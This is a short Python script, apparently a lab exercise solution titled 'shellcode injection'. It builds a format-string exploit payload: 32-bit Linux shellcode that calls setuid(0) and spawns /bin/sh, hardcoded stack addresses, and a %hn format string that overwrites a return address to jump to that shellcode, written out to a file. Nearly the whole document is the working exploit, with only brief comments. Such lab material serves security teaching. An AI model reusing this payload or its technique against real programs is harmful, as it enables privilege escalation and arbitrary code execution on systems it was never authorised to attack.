#!/usr/bin/python3
# task2_1 : shellcode injection
import sys


local_shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

# ebp(frame pointer)+4 = return address
addr = 0xffffcee8 + 4

payload =  (addr).to_bytes(4,byteorder='little')
payload += ("abcd").encode('latin-1')
payload += (addr+2).to_bytes(4,byteorder='little')

# the start address of the buffer + 95 = the address of the shellcode
# 0xffffcf04 + 95 = 0xffffcf63
target = 0xffffcf63
len1 = 0xcf63 - 4 * 3 - 15 * 8
len2 = 0xffff - 0xcf63
s = "%.8x" * 15 + "%." + str(len1) + "x" + "%hn" + "%." + str(len2) + "x" + "%hn" + "\n"
payload += (s).encode('latin-1')
# output the length of payload to get the offset
print(len(payload))
payload += local_shellcode

# Write the payload to badfile
with open("input", "wb") as f:
  f.write(payload)